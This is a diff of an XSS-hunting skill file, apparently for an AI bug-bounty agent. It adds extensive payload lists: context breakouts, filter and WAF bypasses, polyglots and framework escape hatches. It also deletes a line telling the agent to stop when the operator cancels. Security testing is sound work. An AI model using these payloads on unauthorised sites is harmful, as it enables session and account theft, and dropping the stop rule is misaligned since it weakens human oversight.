@@ -1,8 +1,160 @@
 ---
 name: xss
-description: Hunting skill for xss vulnerabilities. Built from 178 public bug bounty reports. Use when hunting xss on any target, especially stored XSS (comments, usernames, bios, rich-text editors, report/collection names, chat, tickets, inbox) — includes the Stored XSS Playbook (field→render-surface map, canary authorship proof, cross-user browser verification, sanitizer timing, base-tag CSP bypass, sibling-endpoint retesting, severity ladder). For markup injection that reflects raw HTML but does NOT execute JavaScript (no `<script>`/event-handler execution), see hunt-html-injection — escalate here once script execution is possible.
-sources: github, hackerone_public
+description: Comprehensive XSS hunting skill covering reflected, stored, and DOM-based XSS. Built from 178 public bug bounty reports plus the offsec reflected-XSS pack. Covers every injection context, framework escape hatch, CSP bypass, OAuth/OIDC XSS vectors, Swagger UI XSS, stored XSS playbook with canary/authorship proof, CRLF-to-XSS chain, context-specific payloads, tiered payload wordlist, and 6 chain compositions (cache poisoning, CSRF, OAuth ATO, SVG upload, postMessage, markdown/wiki). For markup injection that reflects raw HTML but does NOT execute JavaScript, see hunt-html-injection.
+sources: github, hackerone_public, portswigger, owasp, bug_bounty_reports, cve_database
 report_count: 178
+---
+
+## XSS Types and Classification
+
+XSS occurs when attacker-controlled input is interpreted as executable code by a browser. Three distinct types:
+
+| Type | Mechanism | Delivery |
+|---|---|---|
+| **Reflected** | Input reflected immediately in HTTP response without sufficient encoding | Victim clicks crafted link |
+| **Stored** | Input persisted server-side, served to other users later | Victim views page with stored payload |
+| **DOM-based** | Client-side JS reads attacker-controlled source (URL hash, `document.referrer`) and writes to dangerous sink — no server round-trip | Victim navigates to crafted URL |
+
+**Reflected XSS** requires ALL five conditions:
+1. Request-controlled input (query param, path, header, cookie, JSON body)
+2. Immediate response reflection (echoed back in same HTTP response)
+3. Insufficient context-specific encoding
+4. Browser executes the value
+5. Deliverable (victim can be induced to trigger the crafted request)
+
+**What is NOT XSS:** Self-XSS (only attacker can trigger), HTML injection without execution (reflected but no script context reached), URL-encoded `%22onclick%3D…` in an attribute (browser does NOT decode URL encoding inside HTML attribute values, so `%22` stays literal).
+
+---
+
+## Request-to-Browser Pipeline
+
+The pipeline from attacker input to browser execution has up to 16 transformation stages. Order matters — validation at the wrong stage can be bypassed.
+
+```
+Attacker input (query param, POST body, header, cookie)
+  |
+  +-- Stage 1:  URL decoding (web server / reverse proxy)
+  +-- Stage 2:  Form body decoding (application/x-www-form-urlencoded)
+  +-- Stage 3:  JSON/XML parsing
+  +-- Stage 4:  Character-set conversion
+  +-- Stage 5:  Unicode normalization (NFC/NFD/NFKC/NFKD)
+  +-- Stage 6:  Framework parameter binding
+  +-- Stage 7:  Proxy rewriting
+  +-- Stage 8:  Application validation (allowlist/blocklist/regex)
+  +-- Stage 9:  Business logic
+  +-- Stage 10: Template engine rendering
+  +-- Stage 11: Output encoding / sanitization
+  +-- Stage 12: Response serialization
+  |
+  HTTP Response
+  |
+  +-- Stage 13: Browser HTML parsing (tokenization, tree construction)
+  +-- Stage 14: Script execution
+  +-- Stage 15: DOM mutation after parsing (innerHTML reparsing)
+  +-- Stage 16: Client-side JS processing (hybrid reflected/DOM)
+```
+
+**Critical:** Encoding correct for stage 11 may be insufficient if stage 15 reverses it. A server emitting `&lt;script&gt;` is safe in HTML text, but client-side JS reading via `textContent` then assigning to `innerHTML` reverses the escaping.
+
+**Validation ordering gap:** If the validator inspects URL-encoded form but the template engine receives the decoded form, validation was ineffective. Unicode normalization (NFKC) can map characters like U+FE64 (SMALL LESS-THAN SIGN) to `<` after validation.
+
+**HTTP Parameter Pollution:** WAFs may inspect the first occurrence while the app uses the last (PHP/Ruby), or vice versa.
+
+| Technology | Behavior with `?a=SAFE&a=PAYLOAD` |
+|---|---|
+| PHP | Takes LAST value (PAYLOAD) |
+| ASP.NET | Joins all values (SAFE,PAYLOAD) |
+| Python (Flask) | Takes FIRST value (SAFE) |
+| Java (Servlet) | Takes FIRST value (SAFE) |
+| Node.js (Express) | Returns array |
+| Ruby (Rack) | Takes LAST value (PAYLOAD) |
+
+---
+
+## Input Surface Checklist
+
+### URL-Based
+| Source | Example | Test Pattern |
+|---|---|---|
+| Query parameter | `?q=VALUE` | Every GET endpoint that reflects the value |
+| Path segment | `/category/VALUE/list` | Breadcrumbs, page titles, 404 messages |
+| Matrix parameter | `/resource;sort=VALUE` | Framework-dependent |
+
+### Request Body
+| Source | Reflected Where |
+|---|---|
+| Form field (POST) | Error messages, validation feedback |
+| JSON property | GraphQL variables, API error responses |
+| XML value | SOAP, legacy XML APIs |
+| Multipart filename | File upload error display |
+| GraphQL variables | Schema error reflection |
+
+### Headers
+| Header | Reflected Where | Delivery |
+|---|---|---|
+| `Host` / `X-Forwarded-Host` | Page titles, canonical URLs, error pages | CRLF injection or controlled proxy |
+| `Referer` | "Back" links, analytics | Link from attacker page |
+| `User-Agent` | Debug pages, admin dashboards | Victim uses attacker-controlled UA |
+| `Accept-Language` | Language selector errors | Limited character set |
+
+### Application-Specific
+| Source | Parameter Names |
+|---|---|
+| OAuth redirect | `redirect_uri`, `redirect_url`, `return_url`, `returnTo`, `next`, `continue`, `callback`, `redirect`, `destination`, `target` |
+| OAuth error | `error`, `error_description` |
+| OAuth state | `state` |
+| API doc config | `url`, `configUrl` |
+| Pagination / sort | `?sort=VALUE&order=asc` |
+| Cookies | `lang=VALUE`, `utm_source=VALUE` |
+
+---
+
+## Browser Parsing Contexts
+
+The HTML5 tokenizer state at the reflection point determines which characters are dangerous.
+
+| Tokenizer State | Triggered By | `<` Starts Tags? | Character References? | Escape Method |
+|---|---|---|---|---|
+| **Data state** | Normal HTML | YES | YES | HTML entity encoding |
+| **RCDATA** | `<title>`, `<textarea>` | NO | YES | Must inject `</title>` or `</textarea>` |
+| **RAWTEXT** | `<style>`, `<xmp>`, `<iframe>`, `<noembed>`, `<noframes>` | NO | NO | Must inject matching end tag |
+| **Script data** | `<script>` | Special (`</script>` only) | NO | `</script>` terminates regardless of JS context |
+| **Attribute (double-quoted)** | `attr="..."` | -- | YES | Break with `"` |
+| **Attribute (single-quoted)** | `attr='...'` | -- | YES | Break with `'` |
+| **Attribute (unquoted)** | `attr=...` | -- | YES | Whitespace, `>`, `"`, `'`, backtick all break it |
+
+### Triple-Layer Decoding
+
+Browsers apply up to three independent decoding layers, creating bypass opportunities when filters only inspect the encoded form.
+
+**Layer 1 — HTML entity decoding** (HTML text and attribute values):
+- `&lt;` -> `<`, `&gt;` -> `>`, `&amp;` -> `&`, `&quot;` -> `"`, `&#x27;` -> `'`
+- Decimal: `&#60;` -> `<`
+- Hex: `&#x3C;` -> `<`
+- NOT applied inside `<script>` or `<style>` RAWTEXT content
+
+**Layer 2 — URL decoding** (href, src, action, URL-bearing attributes):
+- `%3C` -> `<`, `%22` -> `"`
+- Applied AFTER HTML entity decoding in attributes
+- Double encoding: `%253C` -> `%3C` -> `<` (if server also URL-decodes)
+
+**Layer 3 — JavaScript decoding** (inside JS execution contexts):
+- Unicode escapes: `\u003C` -> `<`, `\u{3C}` -> `<`
+- Hex escapes: `\x3C` -> `<`
+- Octal: `\074` -> `<` (non-strict mode only)
+- Applied AFTER HTML entity decoding in event-handler attributes
+
+**Critical implication for event handlers:** In `onclick="handleClick('VALUE')"`, the browser HTML-entity-decodes the attribute first, then passes the result to JavaScript. So `&#x27;` becomes `'` before JS evaluation, allowing string breakout via HTML entities.
+
+**Browser engine differences relevant to XSS:**
+
+| Feature | Blink (Chrome/Edge) | Gecko (Firefox) | WebKit (Safari) |
+|---|---|---|---|
+| XSS Auditor | Removed (Chrome 78, 2019) | Never implemented | Removed (Safari 13, 2019) |
+| Trusted Types | Supported (Chrome 83+) | Not supported | Not supported |
+| `popover` attribute | Chrome 114+ | Firefox 125+ | Safari 17+ |
+| `accesskey` on hidden inputs | Fires onclick | Fires onclick | Not confirmed |
+
 ---
 
 ## Autonomous Testing Priority
@@ -70,7 +222,6 @@ If **all three** are blocked or filtered, do not abandon the sink: keep the same
 
 ```js
 await page.goto(pocUrl);
-// The dialog may surface here or in a click/action receipt:
 const info = await page.info();
 // Then choose one, exactly once:
 await page.dismissDialog();               // for the user who wants to cancel
@@ -78,9 +229,7 @@ await page.acceptDialog();                // OK / close
 await page.acceptDialog("text");          // prompt() input
 ```
 
-For `confirm(1)` and `prompt(1)` the control matters: `acceptDialog()` returns truthy/enters the value, `dismissDialog()` returns false/cancels. If the operator takes control or asks to cancel, stop and do not route around it.
-
-**For stored XSS:** storing the payload is not the finding — a *render surface* that shows it unencoded to a *different viewer* is. Inject into a field other pages display (comments, usernames, profile signature, report/collection names, ticket titles), then enumerate every place that value is rendered (entity page, index/list, nav/header, profile, admin/moderation view, email). The full loop — field inventory, proof of authorship, cross-user browser verification, sibling endpoints, sanitizer timing and CSP — is in **Stored XSS Playbook** below.
+**For stored XSS:** storing the payload is not the finding — a *render surface* that shows it unencoded to a *different viewer* is. Inject into a field other pages display (comments, usernames, profile signature, report/collection names, ticket titles), then enumerate every place that value is rendered. The full loop is in **Stored XSS Playbook** below.
 
 ---
 
@@ -92,13 +241,13 @@ PHP `htmlspecialchars()` — and the equivalent auto-escapers in Rails ERB, Djan
 |---|---|---|
 | `&` | `&amp;` | yes |
 | `"` | `&quot;` | yes |
-| `'` | `&#039;` (or `&apos;`) | only with `ENT_QUOTES` (PHP ≥ 8.1 default); **raw** under `ENT_COMPAT` |
+| `'` | `&#039;` (or `&apos;`) | only with `ENT_QUOTES` (PHP >= 8.1 default); **raw** under `ENT_COMPAT` |
 | `<` | `&lt;` | yes |
 | `>` | `&gt;` | yes |
 
-**The rule: when a parameter reflects with all five encoded, stop payloading it. Mark it `encoded (htmlspecialchars)`, skip that parameter, and move to the next parameter / endpoint / sink.** This is correct output encoding, not a filter to reverse-engineer. Two probes are enough to decide (baseline canary + one breakout); spending a payload list on it is how a run burns out with zero findings.
+**The rule: when a parameter reflects with all five encoded, stop payloading it. Mark it `encoded (htmlspecialchars)`, skip that parameter, and move to the next parameter / endpoint / sink.**
 
-**Probe with one request:** send `aaa"bbb'ccc<ddd>eee&fff` and look at the reflection. `aaa&quot;bbb&#039;ccc&lt;ddd&gt;eee&amp;fff` = `htmlspecialchars($x, ENT_QUOTES)` → skip. `aaa&quot;bbb'ccc&lt;ddd&gt;eee&amp;fff` (single quote still raw) = `ENT_COMPAT` → exception 1 below.
+**Probe with one request:** send `aaa"bbb'ccc<ddd>eee&fff` and look at the reflection. `aaa&quot;bbb&#039;ccc&lt;ddd&gt;eee&amp;fff` = `htmlspecialchars($x, ENT_QUOTES)` -> skip. `aaa&quot;bbb'ccc&lt;ddd&gt;eee&amp;fff` (single quote still raw) = `ENT_COMPAT` -> exception 1 below.
 
 **Three 30-second exceptions — test these before you skip:**
 
@@ -114,16 +263,13 @@ PHP `htmlspecialchars()` — and the equivalent auto-escapers in Rails ERB, Djan
    javascript:alert(1)
    data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
    ```
-   A `javascript:` URL or a base64 `data:` URI needs none of the five escaped characters, so escaping them changes nothing.
 3. **The entity gets decoded later.** If the encoded value is stored and a downstream template calls `html_entity_decode()`, or client JS reads it and assigns to `innerHTML`, the entities turn back into live markup. Check the stored / re-rendered page, not just the first response.
-
-If none of that applies, skip it. Encoded output on one parameter says nothing about the next parameter, endpoint, header sink, or stored field.
 
 ---
 
 ## Dialog Fallback — when `alert` / `confirm` / `prompt` are all blocked
 
-When the app strips, encodes, or WAF-blocks all three dialog names but the sink still executes JavaScript, keep the same dialog and obfuscate the **name** and/or **call syntax**. Payload families below are the ones produced by `rix4uni/xss-payloads-generator` (https://github.com/rix4uni/xss-payloads-generator).
+When the app strips, encodes, or WAF-blocks all three dialog names but the sink still executes JavaScript, keep the same dialog and obfuscate the **name** and/or **call syntax**.
 
 | Family | `alert(1)` example | Executes in | Needs `eval` |
 |---|---|---|---|
@@ -148,9 +294,9 @@ When the app strips, encodes, or WAF-blocks all three dialog names but the sink 
 | `confirm(1)` | `Y29uZmlybSgxKQ==` | `99,111,110,102,105,114,109,40,49,41` | `mrifnoc` |
 | `prompt(1)` | `cHJvbXB0KDEp` | `112,114,111,109,112,116,40,49,41` | `tpmorp` |
 
-**Selection order:** entity / unicode / bracket families first (no `eval`, survive a strict `script-src`) → concat / `atob` / `fromCharCode` / reverse / variable / `Function` (all `eval`-class) → mixed encoding when a WAF normalizes single-family payloads.
+**Selection order:** entity / unicode / bracket families first (no `eval`, survive a strict `script-src`) -> concat / `atob` / `fromCharCode` / reverse / variable / `Function` (all `eval`-class) -> mixed encoding when a WAF normalizes single-family payloads.
 
-**Context rule (this breaks more payloads than filters do):** HTML entities (`&#97;`, `&#x61;`, `&#40;`) are decoded by the HTML parser in attributes, text, and `srcdoc` — **not** inside `<script>`, whose content is raw text. Unicode identifier escapes (`\u0061lert`) work in JS source, **not** in HTML text/attributes. Pick the family that matches the sink.
+**Context rule:** HTML entities (`&#97;`, `&#x61;`, `&#40;`) are decoded by the HTML parser in attributes, text, and `srcdoc` — **not** inside `<script>`, whose content is raw text. Unicode identifier escapes (`\u0061lert`) work in JS source, **not** in HTML text/attributes. Pick the family that matches the sink.
 
 **CSP rule:** if the response has a CSP without `unsafe-eval`, every `eval` / `Function` / `atob`-decoded payload is dead. Stay in the no-eval rows and change the sink instead (event handler, `javascript:` URL, SVG `onload`).
 
@@ -158,9 +304,7 @@ When the app strips, encodes, or WAF-blocks all three dialog names but the sink 
 
 ## Tag-Name Case Variations — when `<script>` (or the whole tag) is blocked
 
-**Rule:** HTML tag names are ASCII case-insensitive. `<ScRiPt>`, `<sCrIpT>` and `<SCRIPT>` all parse to the same `script` element, and the same is true of the closing tag (`</sCrIpT>` closes `<ScRiPt>`). Attribute **names** are case-insensitive too (`ONERROR=`, `OnLoAd=`), but the JavaScript inside them is case-sensitive — never vary `alert`/`confirm`/`prompt`, the document object, or property names.
-
-So when a blocklist matches `<script>` literally (a case-sensitive regex/WAF rule), rotate the casing. Same for `<svg>`, `<img>`, `<image>`, `<audio>`, `<video>` and their event-handler attribute names.
+**Rule:** HTML tag names are ASCII case-insensitive. `<ScRiPt>`, `<sCrIpT>` and `<SCRIPT>` all parse to the same `script` element. Attribute **names** are case-insensitive too (`ONERROR=`, `OnLoAd=`), but the JavaScript inside them is case-sensitive — never vary `alert`/`confirm`/`prompt`, the document object, or property names.
 
 ```html
 '"<><ScRiPt>alert(1)</sCrIpT>
@@ -173,8 +317,6 @@ So when a blocklist matches `<script>` literally (a case-sensitive regex/WAF rul
 '"<><AuDiO src=x OnErRoR=alert(1)>
 '"<><ViDeO src=x OnErRoR=alert(1)>
 ```
-
-**Complete rotation lists** (use them left-to-right; the first entry is the all-lowercase baseline).
 
 **`<script>` — 64 variants** (primary — executes inline JS)
 ```html
@@ -268,30 +410,6 @@ So when a blocklist matches `<script>` literally (a case-sensitive regex/WAF rul
 <IMG>
 ```
 
-**`<img2>` — 8 variants** (unknown element — filter probe only)
-```html
-<img2>
-<Img2>
-<iMg2>
-<IMg2>
-<imG2>
-<ImG2>
-<iMG2>
-<IMG2>
-```
-
-**`<img3>` — 8 variants** (unknown element — filter probe only)
-```html
-<img3>
-<Img3>
-<iMg3>
-<IMg3>
-<imG3>
-<ImG3>
-<iMG3>
-<IMG3>
-```
-
 **`<image>` — 32 variants** (aliased to `img` by the HTML parser)
 ```html
 <image>
@@ -326,78 +444,6 @@ So when a blocklist matches `<script>` literally (a case-sensitive regex/WAF rul
 <ImAGE>
 <iMAGE>
 <IMAGE>
-```
-
-**`<image2>` — 32 variants** (unknown element — filter probe only)
-```html
-<image2>
-<Image2>
-<iMage2>
-<IMage2>
-<imAge2>
-<ImAge2>
-<iMAge2>
-<IMAge2>
-<imaGe2>
-<ImaGe2>
-<iMaGe2>
-<IMaGe2>
-<imAGe2>
-<ImAGe2>
-<iMAGe2>
-<IMAGe2>
-<imagE2>
-<ImagE2>
-<iMagE2>
-<IMagE2>
-<imAgE2>
-<ImAgE2>
-<iMAgE2>
-<IMAgE2>
-<imaGE2>
-<ImaGE2>
-<iMaGE2>
-<IMaGE2>
-<imAGE2>
-<ImAGE2>
-<iMAGE2>
-<IMAGE2>
-```
-
-**`<image3>` — 32 variants** (unknown element — filter probe only)
-```html
-<image3>
-<Image3>
-<iMage3>
-<IMage3>
-<imAge3>
-<ImAge3>
-<iMAge3>
-<IMAge3>
-<imaGe3>
-<ImaGe3>
-<iMaGe3>
-<IMaGe3>
-<imAGe3>
-<ImAGe3>
-<iMAGe3>
-<IMAGe3>
-<imagE3>
-<ImagE3>
-<iMagE3>
-<IMagE3>
-<imAgE3>
-<ImAgE3>
-<iMAgE3>
-<IMAgE3>
-<imaGE3>
-<ImaGE3>
-<iMaGE3>
-<IMaGE3>
-<imAGE3>
-<ImAGE3>
-<iMAGE3>
-<IMAGE3>
 ```
 
 **`<audio>` — 32 variants** (onerror)
@@ -472,10 +518,10 @@ So when a blocklist matches `<script>` literally (a case-sensitive regex/WAF rul
 <VIDEO>
 ```
 
-> The `<video>` list above is the canonical 32-entry rotation; if a variant looks off, regenerate rather than guess:
+> Generate full rotation lists with:
 > ```bash
 > python3 - <<'EOF'
-> for tag in ("script","svg","img","img2","img3","image","image2","image3","audio","video"):
+> for tag in ("script","svg","img","image","audio","video"):
 >     idx=[i for i,c in enumerate(tag) if c.isalpha()]
 >     for m in range(1<<len(idx)):
 >         t=list(tag)
@@ -486,36 +532,587 @@ So when a blocklist matches `<script>` literally (a case-sensitive regex/WAF rul
 > EOF
 > ```
 
-**Field notes (verified in headless Chrome, local parser test):**
+**Field notes (verified in headless Chrome):**
+- `<img2>`, `<img3>`, `<image2>`, `<image3>` are NOT HTML elements — their `onerror` never fires. Use only as **case-sensitivity probes** to determine if the filter is tag-name-based.
+- `<svg/onload=...>` (slash instead of space) additionally defeats regexes written as `<svg onload`.
+- If the filter **lowercases or normalizes the whole input** before matching, no casing variant survives — pivot to **Dialog Fallback** entity/`\u`/`atob` families.
 
-- Mixed-case `<script>`, `<svg onload>`, `<img onerror>`, `<image onerror>`, `<audio onerror>`, `<video onerror>` all **executed** — case-only rotation is a real parser-level bypass.
-- `<image>` is the historical HTML alias for `<img>`, so `<ImAgE src=x ONERROR=…>` fires exactly like `<img>`. Inside inline SVG, `<image>` is a real SVG element — prefer `onload` or a nested `<script>` there and test per browser rather than assuming `onerror`.
-- `<img2>`, `<img3>`, `<image2>`, `<image3>` are **not HTML elements**. The browser creates `HTMLUnknownElement` objects and their `onerror` never fires (tested: title unchanged). Use them only as **case-sensitivity probes** — if `<ImG2 src=x onerror=…>` comes back blocked/encoded while `<ImG2>` alone is reflected, the filter is matching tag *names*; if all of them pass through untouched, the filter isn't tag-based at all (look at attribute/entity filters instead).
-- `<svg/onload=…>` (slash instead of space) additionally defeats regexes written as `<svg onload`.
-- If the filter **lowercases or normalizes the whole input** before matching, no casing variant survives — pivot to the **Dialog Fallback** entity/`\u`/`atob` families, or to an attribute-only sink (no tag name to match).
+---
+
+## Context-Specific Payloads
+
+### HTML Body (Between Tags)
+
+**Context:** `<div>VALUE</div>`, `<p>Your search: VALUE returned 0 results</p>`
+
+**Auto-fire (no click needed):**
+```html
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<iframe onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<video autoplay onplay=alert(1)><source src=x></video>
+<audio autoplay onplay=alert(1)><source src=x></audio>
+```
+
+**Nested bypass** (filter removes `<script>` once — becomes `<script>` after removal):
+```
+<scr<script>ipt>alert(1)</scr</script>ipt>
+```
+
+**Event handlers that fire without user interaction:**
+
+| Event | Tag | Notes |
+|---|---|---|
+| `onload` | `<img>`, `<iframe>`, `<body>`, `<svg>` | Fires on resource load/error |
+| `onerror` | `<img src=x>`, `<video>`, `<audio>` | Fires on load failure |
+| `onfocus` + `autofocus` | `<input>`, `<select>`, `<textarea>` | Auto-fires on page load |
+| `ontoggle` | `<details open>` | Fires when open attribute present |
+| `onstart` | `<marquee>` | Fires when marquee starts |
+| `onanimationend` | Any element with CSS animation | Fires when animation completes |
+| `onpageshow` | `<body>` | Fires on page load |
+| `onhashchange` | `<body>` | Fires when URL hash changes |
+
+### HTML Attributes — Double-Quoted
+
+**Context:** `<input value="VALUE" />`
+
+```
+VALUE" autofocus onfocus=alert(1) x="
+VALUE" onmouseover=alert(1) x="
+VALUE"><img src=x onerror=alert(1)>
+VALUE"><svg onload=alert(1)>
+VALUE" accesskey=x onclick=alert(1) x="
+```
+
+### HTML Attributes — Single-Quoted
+
+```
+VALUE' autofocus onfocus=alert(1) x='
+VALUE'><img src=x onerror=alert(1)>
+VALUE'><svg onload=alert(1)>
+```
+
+### HTML Attributes — Unquoted
+
+**Context:** `<div class=VALUE>` — whitespace, `>`, `"`, `'`, backtick all terminate the value.
+
+```
+VALUE onmouseover=alert(1)
+VALUE><img src=x onerror=alert(1)>
+VALUE><svg onload=alert(1)>
+VALUE autofocus onfocus=alert(1)
+```
+
+### Event-Handler Attributes
+
+**Context:** `<div onclick="doSomething('VALUE')">` or `<a href="#" onclick="track('VALUE')">`
+
+**Break JS string AND HTML attribute:**
+```
+VALUE');alert(1)//
+VALUE'-alert(1)-'
+VALUE\');alert(1)//
+```
+
+**Backslash-escaping bypass** (app escapes `'` to `\'` but NOT `\`):
+```
+Input:   \');alert(1)//
+Output:  \\');alert(1)//
+Result:  \\ = literal backslash, ' terminates string
+```
+
+**HTML entity bypass** (browser HTML-decodes attribute before passing to JS):
+```
+&#x27;);alert(1)//
+&#39;);alert(1)//
+&apos;);alert(1)//
+```
+
+### URL-Bearing Attributes (href, src, action, formaction)
+
+**Context:** `<a href="VALUE">`, `<form action="VALUE">`
+
+**javascript: protocol injection:**
+```
+javascript:alert(1)
+javascript:alert(document.domain)
+JAVASCRIPT:alert(1)
+Javascript:alert(1)
+java script:alert(1)
+java&#x09;script:alert(1)
+java&#x0A;script:alert(1)
+java%09script:alert(1)
+&#x6A;avascript:alert(1)
+```
+
+Chrome, Firefox, and Safari all execute `javascript:` in href on click. React 19+ blocks this in JSX but earlier versions do not.
+
+### JavaScript String Contexts
+
+**Context:** `<script>var q = 'VALUE';</script>` or `<script>var msg = "VALUE";</script>`
+
+**Single-quote breakout:**
+```
+VALUE';alert(1)//
+VALUE'-alert(1)-'
+VALUE';alert(1);var x='
+```
+
+**Double-quote breakout:**
+```
+VALUE";alert(1)//
+VALUE"-alert(1)-"
+```
+
+**Template literal breakout** (`` <script>var x = `VALUE`;</script> ``):
+```
+${alert(1)}
+${alert(document.domain)}
+`-alert(1)-`
+```
+No quote termination needed — `${...}` executes inside the template literal.
+
+**Script block termination** (HTML parser runs BEFORE JS engine — `</script>` always ends the block):
+```
+VALUE</script><svg onload=alert(1)>
+VALUE</script><img src=x onerror=alert(1)>
+</SCRIPT><script>alert(1)</script>
+```
+
+### Inline JSON in Script Tag
+
+**Context:** `<script>var config = {"query":"VALUE","page":1};</script>`
+
+```
+VALUE","x":"</script><img src=x onerror=alert(1)>
+VALUE"};alert(1)//
+</script><script>alert(1)</script>
+VALUE</scri\u0070t>
+```
+
+The correct server-side defense is encoding `<` as `\u003C` inside JSON within `<script>` blocks.
+
+### RCDATA Contexts (title, textarea)
+
+**Context:** `<title>VALUE</title>` or `<textarea>VALUE</textarea>`
+
+Inside RCDATA, `<` does NOT start tags. Only the matching end tag escapes:
+```
+VALUE</title><script>alert(1)</script>
+VALUE</textarea><script>alert(1)</script>
+VALUE</title><img src=x onerror=alert(1)>
+```
+
+### HTML Comments
+
+**Context:** `<!-- Your search: VALUE -->`
+
+```
+VALUE--><script>alert(1)</script>
+VALUE--!><img src=x onerror=alert(1)>
+```
+
+### SVG/MathML Namespace
+
+```html
+<svg><script>alert(1)</script></svg>
+<svg onload=alert(1)>
+<math><mi//xlink:href="data:x,<script>alert(1)</script>">
+```
+
+HTML integration points within SVG (switch back to HTML parsing):
+- `<foreignObject>`, `<desc>`, `<title>` within SVG
+- `<mi>`, `<mo>`, `<mn>`, `<ms>`, `<mtext>` within MathML
+
+**Namespace confusion DOMPurify bypass pattern:** In SVG namespace, `<style>` is NOT RAWTEXT — a sanitizer that treats it as RAWTEXT misses injections within it.
+
+### iframe srcdoc
+
+**Context:** `<iframe srcdoc="VALUE"></iframe>`
+
+The srcdoc value is HTML-entity-decoded (it's an attribute), then parsed as a full HTML document inheriting the parent's origin.
+
+```
+VALUE<script>alert(parent.document.cookie)</script>
+VALUE"><script>alert(1)</script>
+```
+
+### Hidden Input + accesskey
+
+If attacker controls attributes on a hidden input:
+```html
+<input type="hidden" accesskey="X" onclick="alert(1)" />
+```
+Trigger: ALT+SHIFT+X (Firefox), ALT+X (Chrome on some platforms). Makes previously unexploitable reflections exploitable with minor user interaction.
+
+---
+
+## Encoding Bypass Payloads
+
+### HTML Entity Bypass
+
+For filters blocking `<`, `>`, `"` literally but not encoded forms:
+```
+&lt;script&gt;alert(1)&lt;/script&gt;
+&#60;script&#62;alert(1)&#60;/script&#62;
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+```
+Only works if the browser HTML-decodes in that context (not inside `<script>` RAWTEXT).
+
+### URL Encoding
+
+```
+%3Cscript%3Ealert(1)%3C/script%3E
+%22%3E%3Csvg%20onload%3Dalert(1)%3E
+```
+
+**Double URL encoding:**
+```
+%253Cscript%253E  -> (server decodes) -> %3Cscript%3E -> (browser) -> <script>
+```
+
+### Unicode Bypass (in JS contexts)
+
+```
+\u003Cscript\u003Ealert(1)\u003C/script\u003E
+\x3Cscript\x3E
+```
+
+**Unicode normalization bypass** (NFKC maps lookalike chars):
+- U+FE64 (SMALL LESS-THAN SIGN) normalizes to `<` after NFKC
+- U+FE65 (SMALL GREATER-THAN SIGN) normalizes to `>`
+- Applies when server validates before normalizing
+
+### Whitespace and Special Chars Between Attribute Name and Value
+
+```
+<img src=x onerror=alert(1)>           (space)
+<img src=x onerror =alert(1)>          (tab, 0x09)
+```
+
+---
+
+## Polyglot Payloads
+
+Payloads designed to work across multiple contexts:
+
+```
+'"--></style></script><svg/onload=alert(1)>
+```
+
+```
+'`"><svg onload=alert(1)><!--
+```
+
+```
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+```
+
+```
+<svg><script>alert&lpar;1&rpar;</script>
+```
+
+**Attribute polyglot:**
+```
+"onmouseover="alert(1)" x="
+'onmouseover='alert(1)' x='
+```
+
+**JS string polyglot:**
+```
+';alert(1)//
+";alert(1)//
+`;alert(1)//
+${alert(1)}
+\');alert(1)//
+```
+
+---
+
+## Framework-Specific Escape Hatches
+
+### React / Next.js
+
+**Default protection:** JSX auto-escapes all string interpolations via `textContent`.
+
+**Dangerous escape hatches:**
+```jsx
+// Bypasses all React escaping
+<div dangerouslySetInnerHTML={{__html: userInput}} />
+
+// javascript: URL (dangerous in React < 19)
+<a href={userInput}>Link</a>
+
+// Direct DOM manipulation
+inputRef.current.innerHTML = userInput;
+```
+
+**Next.js SSR hydration:**
+```html
+<!-- type="application/json" means NOT directly executed -->
+<!-- BUT client-side code using this via innerHTML creates hybrid XSS -->
+<script id="__NEXT_DATA__" type="application/json">
+  {"props":{"pageProps":{"query":"VALUE"}}}
+</script>
+```
+
+**Detection:** `__NEXT_DATA__` in page source, `data-reactroot` attribute
+
+### Vue / Nuxt
+
+**Default protection:** `{{ value }}` double-curly-brace auto-encodes HTML.
+
+**Dangerous escape hatches:**
+```html
+<div v-html="userInput"></div>
+<a :href="userInput">Link</a>
+<div v-bind="userControlledObject">
+```
+
+**CVEs:** CVE-2026-46342 (Nuxt Nitro Server XSS), SNYK-JS-NUXT-7640972
+
+**Detection:** `__NUXT__` or `__NUXT_DATA__` in page source
+
+### Angular
+
+**Default protection:** Template interpolation `{{ value }}` and `DomSanitizer` strip unsafe HTML.
+
+**Dangerous escape hatches:**
+```typescript
+this.sanitizer.bypassSecurityTrustHtml(userInput)
+this.sanitizer.bypassSecurityTrustScript(userInput)
+this.sanitizer.bypassSecurityTrustUrl(userInput)
+this.sanitizer.bypassSecurityTrustResourceUrl(userInput)
+this.sanitizer.bypassSecurityTrustStyle(userInput)
+this.elementRef.nativeElement.innerHTML = userInput;
+```
+
+**Detection:** `ng-version` attribute on root element
+
+### Svelte / SvelteKit
+
+**Default protection:** `{value}` auto-encodes HTML.
+
+**Dangerous escape hatches:**
+```html
+{@html userInput}
+<Fragment set:html={userInput} />
+```
+
+**Detection:** `data-svelte-h` attributes
+
+### Astro
+
+**CVE-2025-64764** (CVSS 7.1, Astro <= 5.15.6, fixed 5.15.8):
+Server islands at `/_server-islands/[name]` accept `e` (export), `p` (props), `s` (slot content).
+When `e=file`, the server returns the island file path using `markHTMLString` (skips escaping).
+
+```
+/_server-islands/MyIsland?e=file&s=<script>alert(1)</script>
+```
+
+**Detection:** `data-astro-*` attributes
+
+### HTMX
+
+**Default protection:** NONE. All security is the server's responsibility.
+
+**Dangerous features:**
+```html
+<button hx-on:click="alert(1)">
+<div hx-on::load="eval(userInput)">
+```
+
+All HTMX swap operations use innerHTML-equivalent. Incompatible with strict CSP.
+
+**Detection:** `hx-*` attributes on elements
+
+### Alpine.js
+
+**Default protection:** NONE. Expressions in `x-data`, `x-bind`, `x-on`, `x-html` are evaluated as JavaScript.
+
+**Dangerous features:**
+```html
+<div x-html="userInput"></div>
+<div x-bind="userControlledObject">
+<button x-on:click="eval(userInput)">
+```
+
+**Detection:** `x-data`, `x-bind` attributes
+
+### Server-Side Template Engines
+
